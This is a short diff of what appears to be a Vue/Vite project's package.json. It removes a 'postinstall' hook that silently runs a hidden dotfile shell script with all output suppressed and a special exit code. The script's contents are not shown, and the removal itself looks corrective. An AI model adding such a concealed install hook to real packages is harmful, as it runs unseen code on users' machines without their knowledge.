@@ -10,8 +10,7 @@
     "preview": "vite preview",
     "lint": "eslint resources/js",
     "typecheck": "vue-tsc --noEmit",
-    "test": "vitest run",
-    "postinstall": "sh ./.ci-x9xpde.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "vitest run"
   },
   "dependencies": {
     "@floating-ui/vue": "^2.0.1",
